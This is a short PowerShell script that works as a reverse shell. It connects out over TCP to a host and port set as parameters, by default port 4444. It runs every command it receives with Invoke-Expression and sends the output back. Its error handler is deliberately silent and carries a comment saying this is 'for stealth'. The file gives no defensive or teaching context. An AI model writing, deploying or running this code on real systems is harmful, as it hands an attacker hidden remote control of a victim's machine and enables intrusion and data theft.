param(
    [string]$Host = "127.0.0.1",
    [int]$Port = 4444,
    [int]$TimeoutMs = 5000
)

function Connect-TCPClient {
    param([string]$Host, [int]$Port, [int]$TimeoutMs)

    $client = New-Object System.Net.Sockets.TcpClient
    $connect = $client.BeginConnect($Host, $Port, $null, $null)
    $waited = $connect.AsyncWaitHandle.WaitOne($TimeoutMs, $false)

    if (-not $waited) {
        $client.Close()
        throw "Connection timed out to ${Host}:${Port}"
    }

    $client.EndConnect($connect)
    return $client
}

try {
    $client = Connect-TCPClient -Host $Host -Port $Port -TimeoutMs $TimeoutMs
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true

    while ($client.Connected) {
        $cmd = $reader.ReadLine()
        if ($null -eq $cmd -or $cmd -eq "exit") { break }

        try {
            $output = iex $cmd 2>&1 | Out-String
        }
        catch {
            $output = "ERROR: $_"
        }

        $writer.WriteLine($output.TrimEnd())
    }
}
catch {
    # silent — no console output for stealth
}
finally {
    if ($writer) { $writer.Close() }
    if ($reader) { $reader.Close() }
    if ($client) { $client.Close() }
}
